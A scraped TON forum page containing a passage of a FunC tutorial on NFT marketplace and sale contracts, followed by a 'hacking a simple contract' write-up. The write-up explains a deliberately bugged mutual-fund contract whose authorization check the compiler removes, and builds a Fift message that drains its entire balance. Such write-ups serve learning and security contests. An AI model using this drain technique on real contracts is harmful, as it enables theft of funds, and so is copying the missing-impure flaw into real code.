  int amount = in_msg_body~load_coins();
  (cell state_init, cell body) = (cs~load_ref(), cs~load_ref());

}
```

Calculate the StateInit hash using [cell\_hash](https://ton-blockchain.github.io/docs/#/func/stdlib?id=cell_hash) and collect the Sale address of the contract:

```
	if (op == 1) { ;; deploy new auction
	  int amount = in_msg_body~load_coins();
	  (cell state_init, cell body) = (cs~load_ref(), cs~load_ref());
	  int state_init_hash = cell_hash(state_init);
	  slice dest_address = begin_cell().store_int(0, 8).store_uint(state_init_hash, 256).end_cell().begin_parse();
	}
```

It remains only to send a message, and then when a message with op == 1 arrives, the marketplace smart contract will initialize the Sale contract.

```
	if (op == 1) { ;; deploy new auction
	  int amount = in_msg_body~load_coins();
	  (cell state_init, cell body) = (cs~load_ref(), cs~load_ref());
	  int state_init_hash = cell_hash(state_init);
	  slice dest_address = begin_cell().store_int(0, 8).store_uint(state_init_hash, 256).end_cell().begin_parse();

	  var msg = begin_cell()
		.store_uint(0x18, 6)
		.store_uint(4, 3).store_slice(dest_address)
		.store_grams(amount)
		.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
		.store_ref(state_init)
		.store_ref(body);
	  send_raw_message(msg.end_cell(), 1); ;; paying fees, revert on errors
	}
```

And that’s it according to the smart contract of the marketplace, below is the full code.

```
;; NFT marketplace smart contract

;; storage scheme
;; storage#_ owner_address:MsgAddress
;;           = Storage;

(slice) load_data() inline {
  var ds = get_data().begin_parse();
  return 
	(ds~load_msg_addr() ;; owner
	 );
}

() save_data(slice owner_address) impure inline {
  set_data(begin_cell()
	.store_slice(owner_address)
	.end_cell());
}

() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	var (owner_address) = load_data();
	throw_unless(401, equal_slices(sender_address, owner_address));
	int op = in_msg_body~load_uint(32);

	if (op == 1) { ;; deploy new auction
	  int amount = in_msg_body~load_coins();
	  (cell state_init, cell body) = (cs~load_ref(), cs~load_ref());
	  int state_init_hash = cell_hash(state_init);
	  slice dest_address = begin_cell().store_int(0, 8).store_uint(state_init_hash, 256).end_cell().begin_parse();

	  var msg = begin_cell()
		.store_uint(0x18, 6)
		.store_uint(4, 3).store_slice(dest_address)
		.store_grams(amount)
		.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
		.store_ref(state_init)
		.store_ref(body);
	  send_raw_message(msg.end_cell(), 1); ;; paying fees, revert on errors
	}
}

() recv_external(slice in_msg) impure {
}
```

### [](#sale-contract-8)Sale Contract

#### [](#review-9)Review

Let’s look at the `op` in `recv_internal()` to understand what this smart contract “can do”.

*   `op` == 1 - empty op to just get Toncoin contracts (you can accumulate crypto in a contract with this op for later use)
*   `op` == 2 - buy NFT - for this op, an auxiliary function buy () is written, which will send messages to make an NFT buy
*   `op` == 3 - cancel sale

#### [](#storage-10)Storage

The first thing we will analyze is what the contract stores in the `c4` register (in other words, storage). Our smart contract has two helper functions `load_data()` and `save_data()` that will upload and save data to storage respectively.

In storage:

*   `slice marketplace_address` - marketplace smart contract address
*   `slice nft_address` - address of sold nft
*   `slice nft_owner_address` - nft owner address
*   `int full_price` - price
*   `cell fees_cell` - a cell containing information about commissions, for example: marketplace commission and royalties

Function code for working with storage:

```
(slice, slice, slice, int, cell) load_data() inline {
  var ds = get_data().begin_parse();
  return 
	(ds~load_msg_addr(), ;; marketplace_address 
	  ds~load_msg_addr(), ;; nft_address
	  ds~load_msg_addr(),  ;; nft_owner_address
	  ds~load_coins(), ;; full_price
	  ds~load_ref() ;; fees_cell
	 );
}

() save_data(slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell) impure inline {
  set_data(begin_cell()
	.store_slice(marketplace_address)
	.store_slice(nft_address)
	.store_slice(nft_owner_address)
	.store_coins(full_price)
	.store_ref(fees_cell)
	.end_cell());
}
```

#### [](#handling-internal-messages-11)Handling internal messages

Like the marketplace smart contract, the sell smart contract starts by unloading the flags and checking that the message is not bounced.

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}

}
```

Next, we upload the address of the sender of the message to the smart contract, as well as the data from the `c4` register (storage).

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}

	slice sender_address = cs~load_msg_addr();

	var (marketplace_address, nft_address, nft_owner_address, full_price, fees_cell) = load_data();
}
```

##### [](#uninitialized-nfts-12)Uninitialized NFTs

Now, before moving on to the logic of selling and canceling the “auction” of the sale, we need to handle the situation when the NFT is uninitialized. To understand whether the NFT is initialized, check whether the address of the owner is zero. And then, using the tilde, we organize the check (`~` is bitwise not in FUNC).

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}

	slice sender_address = cs~load_msg_addr();

	var (marketplace_address, nft_address, nft_owner_address, full_price, fees_cell) = load_data();

	var is_initialized = nft_owner_address.slice_bits() > 2; ;; not initialized if null address

	if (~ is_initialized) {


	}
}
```

I note right away that in the case of an uninitialized NFT, we will only receive messages from the NFT address and only with op meaning the transfer of ownership, so the processing of an uninitialized NFT in the Sale contract comes down to establishing the owner. But let’s go in order:

If the message was sent from the marketplace, we simply accumulate Toncoins in the contract (for example, in the case of a contract deployment).

```
	if (~ is_initialized) {

	  if (equal_slices(sender_address, marketplace_address)) {
		 return (); ;; just accept coins on deploy
	  }

	}
```

Next, we look for the message to come from the NFT contract, and also check that the `op` of such a message is equal to `ownership_assigned`, i.e. this is a message about a change in ownership that has occurred.

```
if (~ is_initialized) {
  
  if (equal_slices(sender_address, marketplace_address)) {
     return (); ;; just accept coins on deploy
  }

  throw_unless(500, equal_slices(sender_address, nft_address));
  int op = in_msg_body~load_uint(32);
  throw_unless(501, op == op::ownership_assigned());

}
```

It remains only to get the address and save the information about the changed ownership of the NFT.

```
	if (~ is_initialized) {

	  if (equal_slices(sender_address, marketplace_address)) {
		 return (); ;; just accept coins on deploy
	  }

	  throw_unless(500, equal_slices(sender_address, nft_address));
	  int op = in_msg_body~load_uint(32);
	  throw_unless(501, op == op::ownership_assigned());
	  int query_id = in_msg_body~load_uint(64);
	  slice prev_owner_address = in_msg_body~load_msg_addr();

	  save_data(marketplace_address, nft_address, prev_owner_address, full_price, fees_cell);

	  return ();

	}
```

##### [](#message-with-empty-body-13)Message with empty body

In this example of a Sale contract, there is also a case where the body of the message that comes into the contract is empty, in which case the contract will simply try to make a purchase by calling the `buy()` helper function.

```
	if (in_msg_body.slice_empty?()) {
		buy(my_balance, marketplace_address, nft_address, nft_owner_address, full_price, fees_cell, msg_value, sender_address, 0);
		return ();
	}
```

After processing the case of an empty message, we get `op` and `query_id`. We will use `op` to build logic, at the very end we will add an error call - for the case when something “incomprehensible” came:

```
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	if (op == 1) { 
		;; аккумулируем в контракте TONCoins'ы
		return ();
	}

	if (op == 2) { 
		 ;; покупка NFT
		return ();
	}

	if (op == 3) { 
		;;отмена продажи
		return ();
	}

	throw(0xffff);
```

##### [](#purchase-14)Purchase

For the purchase, a separate helper function is compiled, which we call in `recv_internal()`.

```
if (op == 2) { ;; buy
 
  buy(my_balance, marketplace_address, nft_address, nft_owner_address, full_price, fees_cell, msg_value, sender_address, query_id);

  return ();

}
```

The first thing to do before making a sale is to check if there are enough funds sent with the message. To do this, you need to check that there is enough money to cover the price, as well as the commissions associated with sending messages.

For commissions, we define a `min_gas_amount()` function that will simply store a value of 1 TON for verification, the function is defined as a low-level TVM primitive, using the `asm` keyword.

```
int min_gas_amount() asm "1000000000 PUSHINT"; ;; 1 TON
```

We will implement the check, and also immediately upload information about royalties, for this there is a separate auxiliary function:

```
() buy(int my_balance, slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell, int msg_value, slice sender_address, int query_id) impure {
  throw_unless(450, msg_value >= full_price + min_gas_amount());

  var (marketplace_fee, royalty_address, royalty_amount) = load_fees(fees_cell);

}

(int, slice, int) load_fees(cell fees_cell) inline {
  var ds = fees_cell.begin_parse();
  return 
	(ds~load_coins(), ;; marketplace_fee,
	  ds~load_msg_addr(), ;; royalty_address 
	  ds~load_coins() ;; royalty_amount
	 );
}
```

Let’s move on to sending messages. We will send the first message to the current NFT owner, we will transfer TONcoins to him. The quantity should be equal to: the price of NFT minus the marketplace commissions and royalties, as well as the remaining balance of the smart contract, in case, for example, the purchase was made by more than one message and there were already TONcoins in the contract.

```
() buy(int my_balance, slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell, int msg_value, slice sender_address, int query_id) impure {
  throw_unless(450, msg_value >= full_price + min_gas_amount());

  var (marketplace_fee, royalty_address, royalty_amount) = load_fees(fees_cell);

  var owner_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(nft_owner_address)
		   .store_coins(full_price - marketplace_fee - royalty_amount + (my_balance - msg_value))
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(owner_msg.end_cell(), 1);

  }
```

Then we send royalties and marketplace commissions, everything is simple here, the corresponding amounts are sent to the royalties and marketplace addresses:

```
() buy(int my_balance, slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell, int msg_value, slice sender_address, int query_id) impure {
  throw_unless(450, msg_value >= full_price + min_gas_amount());

  var (marketplace_fee, royalty_address, royalty_amount) = load_fees(fees_cell);

  var owner_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(nft_owner_address)
		   .store_coins(full_price - marketplace_fee - royalty_amount + (my_balance - msg_value))
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(owner_msg.end_cell(), 1);


  var royalty_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(royalty_address)
		   .store_coins(royalty_amount)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(royalty_msg.end_cell(), 1);


  var marketplace_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(marketplace_address)
		   .store_coins(marketplace_fee)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(marketplace_msg.end_cell(), 1);

}
```

It remains to send the last message, the message to the NFT transfer contract (with `op::transfer()`)

```
() buy(int my_balance, slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell, int msg_value, slice sender_address, int query_id) impure {
  throw_unless(450, msg_value >= full_price + min_gas_amount());

  var (marketplace_fee, royalty_address, royalty_amount) = load_fees(fees_cell);

  var owner_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(nft_owner_address)
		   .store_coins(full_price - marketplace_fee - royalty_amount + (my_balance - msg_value))
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(owner_msg.end_cell(), 1);


  var royalty_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(royalty_address)
		   .store_coins(royalty_amount)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(royalty_msg.end_cell(), 1);


  var marketplace_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(marketplace_address)
		   .store_coins(marketplace_fee)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(marketplace_msg.end_cell(), 1);

  var nft_msg = begin_cell()
		   .store_uint(0x18, 6) 
		   .store_slice(nft_address)
		   .store_coins(0)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		   .store_uint(op::transfer(), 32)
		   .store_uint(query_id, 64)
		   .store_slice(sender_address) ;; new_owner_address
		   .store_slice(sender_address) ;; response_address
		   .store_int(0, 1) ;; empty custom_payload
		   .store_coins(0) ;; forward amount to new_owner_address
		   .store_int(0, 1); ;; empty forward_payload


  send_raw_message(nft_msg.end_cell(), 128 + 32);
}
```

And everything seems to be, but it is worth stopping at the mode with which we sent the last message.

###### [](#burning-contract-mode-128-32-15)“Burning contract” mode == 128 + 32

After sending a message about the transfer of NFT, the smart contract of sale is no longer relevant, the question arises how to “destroy” it or, in other words, “burn it”. TON has a message sending mode that destroys the current contract.

`mode' = mode + 32` means that the current account should be destroyed if its resulting balance is zero. ([Documentation Link](https://ton-blockchain.github.io/docs/#/func/stdlib?id=send_raw_message))

Thus, at the very end of the `buy()` function, we send a message about the transfer of ownership and burn this sales contract.

The final code of the `buy()` function:

```
() buy(int my_balance, slice marketplace_address, slice nft_address, slice nft_owner_address, int full_price, cell fees_cell, int msg_value, slice sender_address, int query_id) impure {
  throw_unless(450, msg_value >= full_price + min_gas_amount());

  var (marketplace_fee, royalty_address, royalty_amount) = load_fees(fees_cell);

  var owner_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(nft_owner_address)
		   .store_coins(full_price - marketplace_fee - royalty_amount + (my_balance - msg_value))
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(owner_msg.end_cell(), 1);


  var royalty_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(royalty_address)
		   .store_coins(royalty_amount)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(royalty_msg.end_cell(), 1);


  var marketplace_msg = begin_cell()
		   .store_uint(0x10, 6) ;; nobounce
		   .store_slice(marketplace_address)
		   .store_coins(marketplace_fee)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);

  send_raw_message(marketplace_msg.end_cell(), 1);

  var nft_msg = begin_cell()
		   .store_uint(0x18, 6) 
		   .store_slice(nft_address)
		   .store_coins(0)
		   .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		   .store_uint(op::transfer(), 32)
		   .store_uint(query_id, 64)
		   .store_slice(sender_address) ;; new_owner_address
		   .store_slice(sender_address) ;; response_address
		   .store_int(0, 1) ;; empty custom_payload
		   .store_coins(0) ;; forward amount to new_owner_address
		   .store_int(0, 1); ;; empty forward_payload


  send_raw_message(nft_msg.end_cell(), 128 + 32);
}
```

##### [](#cancel-sale-16)Cancel sale

Cancellation is simply a message transferring ownership of the NFT from the current owner, to the current owner with `mode == 128 + 32` to burn the contract later. But of course, first you need to check a few conditions.

The first thing to check is that we have enough TONcoin to send messages

```
if (op == 3) { ;; cancel sale
     throw_unless(457, msg_value >= min_gas_amount());

    return ();
}
```

The second is that the message about the cancellation of the sale came either from the marketplace or from the owner of the NFT. To do this, we use the bitwise OR `|`.

```
if (op == 3) { ;; cancel sale
     throw_unless(457, msg_value >= min_gas_amount());
     throw_unless(458, equal_slices(sender_address, nft_owner_address) | equal_slices(sender_address, marketplace_address));

    return ();
}
```

Well, the last is sending a message about the transfer of ownership from the owner to the owner)

```
if (op == 3) { ;; cancel sale
     throw_unless(457, msg_value >= min_gas_amount());
     throw_unless(458, equal_slices(sender_address, nft_owner_address) | equal_slices(sender_address, marketplace_address));

     var msg = begin_cell()
       .store_uint(0x10, 6) ;; nobounce
       .store_slice(nft_address)
       .store_coins(0)
       .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
       .store_uint(op::transfer(), 32)
       .store_uint(query_id, 64) 
       .store_slice(nft_owner_address) ;; new_owner_address
       .store_slice(nft_owner_address) ;; response_address;
       .store_int(0, 1) ;; empty custom_payload
       .store_coins(0) ;; forward amount to new_owner_address
       .store_int(0, 1); ;; empty forward_payload

    send_raw_message(msg.end_cell(), 128 + 32);

    return ();
}
```

## [](#conclusion-17)Conclusion

I publish similar analyzes and tutorials in the telegram channel [Telegram: Contact @ton\_learn](https://t.me/ton_learn), I will be glad for your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/17lesson/nftsale_eng.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/bonus/17lesson/nftsale\_eng.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/17lesson/nftsale_eng.md)

```
# NFT Sale and Marketplace

## Introduction

In this lesson, we will look at how the sale of NFTs can be organized. We will take contract examples from the official [token examples](https://github.com/ton-blockchain/token-contract), we are interested in:
  - nft-marketplace.fc - marketplace contract
  - nft-sale.fc - contract for the sale of a specific NFT

We will build this lesson as follows, first we will look at the top-level how smart contracts work, and then we will go through the code. We will not analyze every word in the code, so if you are unfamiliar with Func, I advise you to go through [lessons](https://github.com/romanovichim/TonFunClessons_Eng).

## Overview of functionality

The marketplace smart contract performs one function, it initializes/deploys the sales smart contract. Thus, the marketplace smart contract simply receives a message with all the necessary data to initialize the sale, and the message initializes the smart contract for the sale.

A smart sales contract performs three functions:
- accumulation of funds within the contract
- sale
- cancellation of the sale

After a successful sale or cancellation, the contract is "burned".
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/17lesson/nftsale_eng.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 454

[TON Research](/)

# [Bonus - Lesson 3 Hacking a simple contract](/t/bonus-lesson-3-hacking-a-simple-contract/454)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)   February 21, 2024, 7:54pm  1

# [](#how-to-hack-simple-smart-contract-in-the-ton-blockchain-1)How to hack simple smart contract in the TON blockchain

[![image](https://tonresear.ch/uploads/default/optimized/1X/8fc8e7f523a8521668d233218a1696e7618f0b3e_2_690x361.jpeg)

image1200×628 105 KB

](https://tonresear.ch/uploads/default/original/1X/8fc8e7f523a8521668d233218a1696e7618f0b3e.jpeg "image")

## [](#introduction-2)Introduction

In this article, we will analyze the hacking of a simple smart contract in the TON network. Don’t worry if you don’t know what TON is or how to write smart contracts, this article will be both a short analysis for the “pros of smart contract development” and a detailed analysis for beginners.

### [](#what-is-ton-3)What is TON?

TON is a decentralized support developed in this area, developed by the Telegram team, in 2019 the Telegram team received a ban from the American Securities Commission to issue their cryptocurrency, which made the continuation of work on protection incredible, but TON was “transferred” to an independent community of participants The Open Network, which is currently observed. It boasts super-fast transactions, ranking wins, collection app boosts, and eco-logicality.

[![image](https://tonresear.ch/uploads/default/optimized/1X/a3ccc559a8b44f96c201c6a0bd926907e1cedbc2_2_690x361.png)

image1200×628 31.7 KB

](https://tonresear.ch/uploads/default/original/1X/a3ccc559a8b44f96c201c6a0bd926907e1cedbc2.png "image")

The TON technical network is a network of virtual machines \[TVM\] ([The Open Network Docs](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview)). TVM also allows you to execute some code. Application developers load programs into the TVM framework. Expected programs on the network are dropped by smart contracts.

In the present, we will analyze a simple smart contract that allows you to provide users with mutual funding to manage their funds.

### [](#acting-model-4)Acting model

The actor model is a mathematical model of computed calculations that underlies TON smart contracts. In it, each smart contract can receive one message, change the state, or send one or more messages per unit of time. It is worth noting that smart contracts have their own balance.

### [](#what-is-hacking-in-production-5)What is hacking in production

Since the smart contracts in the actor model “communicate” via messages, a hack, if it occurs, is a message that will output all media with the balance of the smart contract to the reach address.

### [](#func-and-fift-6)FunC and Fift

TON smart contracts guarantee the stable operation of the TON vehicle. For the development of smart contracts, there is a low-level Fift language, as well as a high-level FunC.

TON often holds various contests for competitions, contracts and hacks, which we will analyze, just with one of these contests.

> If you want to get acquainted with TON, then I offer a free lesson and an exciting game on github, you can watch them at [link](https://github.com/romanovichim/TonFunClessons_eng).

### [](#how-the-analysis-is-built-7)How the analysis is built

First, let’s take a quick look at the smart contract and get excited. If you don’t know what’s going on in the TON network, you can start right away with a detailed breakdown.

## [](#quick-analysis-8)Quick analysis

Before we analyze how to hack a contract, let’s break it down.

### [](#parsing-the-smart-contract-9)Parsing the smart contract

A smart contract implements the following logic:

The contract is a very simplified mutual fund, for two people, it allows them to manage the balance of the contract by sending messages to the contract.

> In the TON actor model of smart contracts, each smart contract can receive one message, change its own state, or send one or more messages per unit of time, thus interaction occurs through messages.

[![image](https://tonresear.ch/uploads/default/optimized/1X/1cafbff0d4cc0041c8cfcbae555bdf81408db254_2_690x361.png)

image1200×628 46.1 KB

](https://tonresear.ch/uploads/default/original/1X/1cafbff0d4cc0041c8cfcbae555bdf81408db254.png "image")

In its storage, the contract stores two addresses, when sending a message, the contract checks that the message was sent from exactly one of these addresses (some kind of authorization) and then puts the message body in register c5 (output action register), thus allowing you to manage the means of smart contract.

Smart contract code:

```
{-

  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  Contract contains intentional bugs, do not use in production

-}


#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

() execute (cell) impure asm "c5 POPCTR";

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}

() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

Let’s go through the code, at the beginning of the smart contract we write an auxiliary function for working with the storage of the smart contract, the `load_data()` function will load two addresses from `c4` into the global variables `addr1`, `addr2`. It is assumed that the logic of the smart contract can only be “launched” from these addresses.

```
#include "stdlib.func";

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();
	  addr1 = ds~load_msg_addr();
	  addr2 = ds~load_msg_addr();
	}
```

Next comes the `recv_internal()` method, which at the very beginning, checks that the message is not empty, skips the message flags, and extracts the sender’s address from the message:

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

}
```

Next, we get the addresses from the storage and check that the address of the sender of the message in the smart contract matches one of the addresses from the storage.

```
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	}
```

It is here that the vulnerability is located, the absence of the `impure` specifier in the `authorize()` function will lead to its removal by the compiler, since according to the documentation:

The `impure` specifier means that the function may have some side effects that should not be ignored. For example, we must specify an impure specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is meant to validate that data.

If `impure` is not specified and the result of a function call is not used, then the FunC compiler can and will remove that function call.

At the end of the smart contract, the message body is written to the output action register `c5`. Thus, for hacking, we just need to send a message there, which will display the Toncoin crypto currency from the smart contract.

```
() execute (cell) impure asm "c5 POPCTR";

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

### [](#parse-message-for-hacking-10)Parse message for hacking

To send a message, we need to write a fift script (which will give us a bag of cells structure that we will send to the TON network), let’s start with the message body, for this we need `<b b>`

```
"TonUtil.fif" include
<b  b> =: message
```

According to the documentation, the message itself may look like this (further code in FunC):

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

Therefore, we write in the body, the address to which we want to withdraw Toncoin, denote the amount as 0 Gram, we will not write anything in the body, we get:

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
```

But in the register `c5` it will be necessary to put not a message, but an action necessary for this message. We will send the message using `SENDRAWMSG`.

But first, let’s figure out how to store data in the `c5` register. Here [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=result-of-tvm-execution) the documentation says that this is a cell, with a link to the previous action , and with the last action. We don’t have a previous action, so there will be an empty `Builder`.

```
<b <b b> ref, здесь будет отправка сообщения ref, b>
```

> ref - adds a reference to Cell c to Builder b.

Go to `SENDRAWMSG`, take the “code” of the function from [371 lines here, directly from the block](https://github.com/ton-blockchain/ton/blob/d01bcee5d429237340c7a72c4b0ad55ada01fcc3/crypto/block/block.tlb) and see , according to [TVM documentation on page 137](https://ton-blockchain.github.io/docs/tvm.pdf), which parameters should be collected:

*   function “code”: 0x0ec3c86d 32 u
*   message sending mode, in our case 128, because we want to withdraw all funds 128 8 u
*   and the message message

> x u - bitness uint x

We get:

```
<b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b>
```

Now we wrap it all in one builder, because. we need a cell for the message:

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message

<b <b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b> ref, b>
```

### [](#how-to-send-a-message-11)How to send a message?

TON has several convenient options for sending `internal` messages, the first one is sending via [toncli](https://github.com/disintar/toncli):

> toncli - handy command line interface

1.  First we collect the fift script, which we have already done
2.  Use the `toncli send` command

Tutorial with pictures) [here](https://github.com/disintar/toncli/blob/master/docs/advanced/send_fift_internal.md).

The second, convenient option is the Go library tonutils-go, how to send a message using tonutils-go, is in one of my [previous lessons](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/14lesson/wallet_eng.md).

## [](#detailed-analysis-12)Detailed analysis

### [](#parsing-the-mutual-fund-contract-code-13)Parsing the mutual fund contract code

#### [](#smart-contract-storage-14)Smart contract storage

Let’s start parsing the code with the “storage” of the smart contract, the storage of permanent data of the smart contract in the TON network is the c4 register.

> For more information about registers, see [here](https://ton-blockchain.github.io/docs/tvm.pdf) in paragraph 1.3

For convenience, we will write a comment what we will store in the contract, and we will store two addresses (`addr1` and `addr2`):

```
;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;
```

> ;; two semicolons single line comment syntax

##### [](#helper-function-framework-15)Helper function framework

For the convenience of working with the storage, we will write an auxiliary function that will unload data, first we declare it:

```
() load_data () impure {

}
```

> `impure` is a keyword that indicates that the function changes the smart contract data. We must specify the `impure` specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is intended to validate that data. **Important**: If impure is not specified and the result of a function call is not used, then the FunC compiler may remove that function call.

##### [](#global-variables-and-data-types-16)Global variables and data types

The addresses in this smart contract are supposed to be stored in global variables of the `slice` type. There are 4 main types in TON:

In our simple smart contract, we will use only four types:

*   Cell (cell) - TVM cell, consisting of 1023 bits of data and up to 4 links to other cells
*   Slice (slice) - A partial representation of the TVM cell used to parse data from the cell
*   Builder - Partially built cell containing up to 1023 bits of data and up to four links; can be used to create new cells
*   Integer - signed 257-bit integer

More about types in FunC:  
[briefly here](https://ton-blockchain.github.io/docs/#/smart-contracts/)  
[deployed here in section 2.1](https://ton-blockchain.github.io/docs/fiftbase.pdf)

In simple terms, cell is a sealed cell, slice is when the cell can be read, and builder is when you assemble the cell.

To make a variable [global](https://ton-blockchain.github.io/docs/#/func/global_variables?id=global-variables) you need to add the `global` keyword.

Let’s declare two addresses of type `slice`:

```
global slice addr1;
global slice addr2;

() load_data () impure {

}
```

Now in the auxiliary function we will get the addresses from the register and pass them to the global variables.

##### [](#data-storage-in-ton-or-register-c4-17)Data storage in TON or register c4

In order to “get” data from c4, we need two functions from the [FunC standard library](https://ton-blockchain.github.io/docs/#/func/stdlib) .

Namely:  
`get_data` - Gets a cell from the c4 register.  
`begin_parse` - converts a cell into a slice

Let’s pass this value to slice ds:

```
global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();

}
```

##### [](#uploading-the-address-18)Uploading the address

Load from the ds address with `load_msg_addr()` - which loads from the slice the only prefix that is a valid MsgAddress. We have two of them, so we ‘unload’ two times.

> `load_msg_addr()` is a function of the standard library, so don’t forget to add the library itself using the [include](https://ton-blockchain.github.io/docs/#/func/compiler_directives?id=include) directive

```
#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
